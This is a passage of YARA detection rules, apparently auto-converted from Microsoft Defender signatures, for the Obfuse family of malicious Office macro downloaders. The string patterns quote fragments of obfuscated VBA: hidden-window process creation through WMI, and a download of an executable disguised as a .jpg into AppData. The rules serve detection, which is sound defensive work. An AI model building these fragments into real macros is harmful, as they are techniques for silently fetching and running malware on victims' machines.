        $x_1_5 = {22 77 69 6e 6d 67 6d 74 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 22 20 2b 20 22 72 6f 63 65 73 73 22 29 29 2e 43 72 65 61 74 65 28 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DJ_2147733677_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DJ"
        threat_id = "2147733677"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub fcL4qOb4()" ascii //weight: 1
        $x_1_2 = ".ID = \"P\" & Issqwe6" ascii //weight: 1
        $x_1_3 = {22 68 74 74 70 3a 2f 2f [0-20] 2e 63 6f 6d 2f [0-6] 2f ?? 2e 6a 70 67 22 2c 20 45 6e 76 69 72 6f 6e 28 22 41 70 70 44 61 74 61 22 29 20 26 20 22 5c [0-10] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DK_2147733690_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DK"
        threat_id = "2147733690"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "+ \"winmgmts:Win32_ProcessStartup\" +" ascii //weight: 1
        $x_1_2 = "+ \"winmgmts:Win32\" + \"_ProcessStartup\" +" ascii //weight: 1
        $x_1_3 = {2b 20 22 77 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 22 20 2b 20 [0-16] 20 2b 20 22 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 22 77 69 6e 6d 22 20 2b 20 22 67 6d 74 73 3a 57 69 6e 33 32 22 [0-1] 20 2b 20 [0-17] 20 2b 20 22 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_5 = {2b 20 22 77 69 6e 6d 22 20 2b 20 [0-16] 20 2b 20 22 67 6d 74 73 3a 57 69 6e 33 32 22 29 20 2b 20 28 [0-16] 20 2b 20 22 5f 50 72 6f 63 65 73 73 53 74 61 72 74 75 70 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_6 = {2b 20 22 77 22 20 2b 20 [0-16] 20 2b 20 22 69 6e 6d 67 6d 74 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_2_7 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 2e 43 72 65 61 74 65 28 28}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DL_2147733694_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DL"
        threat_id = "2147733694"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 53 68 61 70 65 73 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {49 6e 74 65 72 61 63 74 69 6f 6e 2e 53 68 65 6c 6c ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = ".AlternativeText, vbHide" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DM_2147733797_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DM"
        threat_id = "2147733797"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub z()" ascii //weight: 1
        $x_1_2 = {3d 20 56 42 41 2e 53 68 65 6c 6c 28 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 67 6e 28 [0-8] 2e [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DN_2147733831_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DN"
        threat_id = "2147733831"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 2e 43 72 65 61 74 65 ?? 28 28}  //weight: 2, accuracy: Low
        $x_1_2 = {2b 20 22 77 22 20 2b 20 [0-16] 20 2b 20 22 69 6e 6d 67 6d 74 22 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 22 77 22 20 2b 20 [0-16] 20 2b 20 22 69 6e 6d 67 6d 74 22 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 22 69 6e 6d 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_5 = {2b 20 22 77 69 22 20 2b 20 [0-16] 29 20 2b 20 22 6e 6d 22 20 2b 20 22 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_AD_2147733894_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AD"
        threat_id = "2147733894"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Open romp + \"\\groove1.bat\"" ascii //weight: 1
        $x_1_2 = "= \"llkjJHghhhcj^^^8834jhjHGG1244h__++\"" ascii //weight: 1
        $x_1_3 = "= \"HondaDa\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DO_2147733935_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DO"
        threat_id = "2147733935"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub z()" ascii //weight: 1
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 6f 75 6e 64 28 [0-8] 2e [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 67 6e 28 [0-4] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Call z" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DO_2147733935_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DO"
        threat_id = "2147733935"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Sub z()" ascii //weight: 1
        $x_1_2 = {3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 72 52 65 76 65 72 73 65 28 [0-8] 2e 6d 79 6e 65 77 74 78 74 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 56 61 6c 28 [0-8] 2e [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "Call z" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DP_2147733948_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DP"
        threat_id = "2147733948"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 2e 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 ?? 28 28}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 22 77 69 22 20 2b 20 [0-16] 29 20 2b 20 22 6e 6d 22 20 2b 20 22 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 22 6e 6d 22 20 2b 20 22 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 22 20 2b 20 22 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_5 = {2b 20 22 77 69 22 20 2b 20 [0-16] 29 20 2b 20 22 6e 6d 22 20 2b 20 [0-16] 20 2b 20 22 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 65 73 73 53 74 22 20 2b 20 22 61 72 74 75 70 22}  //weight: 1, accuracy: Low
        $x_1_6 = {2b 20 22 77 69 22 20 2b 20 [0-16] 29 20 2b 20 22 6e 6d 22 20 2b 20 [0-16] 20 2b 20 22 67 6d 74 22 20 2b 20 [0-16] 20 2b 20 22 73 3a 57 69 22 20 2b 20 [0-16] 20 2b 20 22 6e 33 32 5f 50 72 22 20 2b 20 22 6f 63 22 20 2b 20 22 65 73 73 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DQ_2147734049_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DQ"
        threat_id = "2147734049"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 20 2b 20 [0-16] 20 2b 20 [0-16] 29 2e 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = "+ \"winm\" + \"gmts:Win32_ProcessStartup\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DR_2147734095_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DR"
        threat_id = "2147734095"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-96] 20 2b 20 [0-96] 29 2e 20 5f}  //weight: 2, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = "\"winm\" + \"gmts:Win32_Process\") +" ascii //weight: 1
        $x_1_4 = "\"winm\" + \"gmts:Win3\" + \"2_Process\") +" ascii //weight: 1
        $x_1_5 = {22 77 69 6e 6d 22 20 2b 20 [0-16] 20 2b 20 22 67 6d 74 73 3a 57 69 6e 33 22 20 2b 20 22 32 5f 50 72 6f 63 22 20 2b 20 22 65 73 73 22 29 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_6 = {22 77 69 6e 6d 22 20 2b 20 [0-16] 20 2b 20 22 67 6d 74 73 22 20 2b 20 22 3a 57 69 6e 33 22 20 2b 20 22 32 5f 50 72 6f 63 22 20 2b 20 22 65 73 73 22 29 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_7 = {2b 20 22 32 5f 50 72 6f 63 22 20 2b 20 22 65 73 73 22 29 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_8 = {2b 20 22 32 5f 22 20 2b 20 22 50 72 6f 63 22 20 2b 20 22 65 73 73 22 29 20 2b 20 [0-16] 20 2b 20 [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_9 = {22 67 6d 74 73 3a 57 69 6e 33 22 20 2b 20 22 32 5f 50 72 6f 63 22 20 2b 20 22 65 73 73 22 29 20 2b 20 [0-16] 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_10 = "\"gmts\" + \":Win3\" _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DS_2147734146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DS"
        threat_id = "2147734146"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 4e 75 6c 6c 2c 20 [0-32] 2c 20 70 72 6f 63 65 73 73 69 64}  //weight: 2, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = "= GetObject(\"winmgmts:Win32_ProcessStartup\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DU_2147734194_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DU"
        threat_id = "2147734194"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-16] 29 2e 43 72 65 61 74 65 20 [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 20 2b}  //weight: 2, accuracy: Low
        $x_1_2 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-16] 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 4f 63 74 28 [0-16] 29 20 2f 20 09 00 20 2a 20 09 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DV_2147734198_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DV"
        threat_id = "2147734198"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= objWMIService.Get(\"Wi\" + \"n\" + \"32_\" & \"Pr\" + \"oce\" + \"ss\" & \"St\" + \"art\" + \"up\")" ascii //weight: 1
        $x_1_2 = ".ShowWindow = HIDDEN_WINDOW" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 20 50 76 53 28 22 [0-16] 22 29 20 26 20 [0-16] 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DT_2147734218_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DT"
        threat_id = "2147734218"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-16] 29 2e 43 72 65 61 74 65 ?? 20 [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 20 2b}  //weight: 2, accuracy: Low
        $x_1_2 = {2e 53 68 6f 77 57 69 6e 64 6f 77 20 3d 20 [0-7] 20 2d}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 4f 63 74 28 [0-16] 29 20 2f 20 09 00 20 2a 20 09 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2d 20 43 68 72 42 28 [0-16] 20 2a 20 52 6f 75 6e 64 28 [0-16] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DW_2147734270_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DW"
        threat_id = "2147734270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-48] 2e [0-48] 29 2e 20 5f}  //weight: 1, accuracy: Low
        $x_2_2 = {43 72 65 61 74 65 ?? 20 [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_3 = {2a 20 48 65 78 28 [0-16] 29 20 2f 20 [0-16] 20 2b 20 53 71 72 28 [0-16] 29 20 2a}  //weight: 1, accuracy: Low
        $x_1_4 = {2f 20 46 69 78 28 [0-16] 20 2b 20 4c 6f 67 28 [0-16] 20 2a 20 53 67 6e 28 [0-16] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = {2a 20 4c 6f 67 28 [0-16] 20 2b 20 41 74 6e 28 [0-16] 20 2a}  //weight: 1, accuracy: Low
        $x_1_6 = {2b 20 41 74 6e 28 [0-16] 20 2a 20 [0-16] 29 29 20 2b 20 [0-16] 20 2b 20 43 44 62 6c 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DX_2147734309_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DX"
        threat_id = "2147734309"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-16] 29}  //weight: 2, accuracy: Low
        $x_1_2 = {2c 20 4e 75 6c 6c 2c 20 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "= GetObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
        $x_1_5 = {2e 43 72 65 61 74 65 ?? 20 [0-16] 2c 20 4e 75 6c 6c 2c 20 [0-16] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_DY_2147734321_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DY"
        threat_id = "2147734321"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2c 20 4e 75 6c 6c 2c 20 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 ?? 20 5f}  //weight: 1, accuracy: Low
        $x_1_4 = "= GetObject(\"winmgmts:Win32_Process\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DZ_2147734369_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DZ"
        threat_id = "2147734369"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-19] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-19] 29 [0-1] 20 5f}  //weight: 1, accuracy: Low
        $x_2_2 = {43 72 65 61 74 65 [0-1] 20 [0-16] 2e [0-19] 20 2b 20 [0-16] 2e [0-35] 20 2b 20 [0-16] 2e [0-19] 20 2b 20}  //weight: 2, accuracy: Low
        $x_1_3 = {2b 20 52 6f 75 6e 64 28 [0-16] 20 2a 20 54 61 6e 28 [0-16] 20 2f 20 43 68 72 28}  //weight: 1, accuracy: Low
        $x_1_4 = {54 61 6e 28 [0-16] 20 2f 20 43 68 72 28 [0-16] 20 2f 20 43 44 62 6c 28}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-16] 2e 56 61 6c 75 65 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-16] 2e [0-19] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-19] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_EA_2147734376_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EA"
        threat_id = "2147734376"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-16] 29}  //weight: 2, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 ?? 28 [0-20] 2c 20 4e 75 6c 6c 2c 20 [0-20] 2c 20 [0-20] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-20] 20 2b 20 22 3a 57 69 6e 33 32 5f 50 72 6f 63 65 73 73 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EB_2147734412_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EB"
        threat_id = "2147734412"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-20] 29}  //weight: 2, accuracy: Low
        $x_1_2 = {2b 20 22 33 32 5f 50 72 6f 63 65 73 73 22 29 2e 43 72 65 61 74 65 ?? 20 [0-20] 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74 2c 20 4e 75 6c 6c 2c 20 [0-20] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "+ \"32_ProcessStartup\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_EC_2147734480_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.EC"
        threat_id = "2147734480"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {3d 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 49 6e 6c 69 6e 65 53 68 61 70 65 73 28 [0-34] 29 2e 41 6c 74 65 72 6e 61 74 69 76 65 54 65 78 74}  //weight: 2, accuracy: Low
        $x_1_2 = "= GetObject(\"new:0006F03A-0000-0000-C000-000000000046\")" ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 29 2e 52 75 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

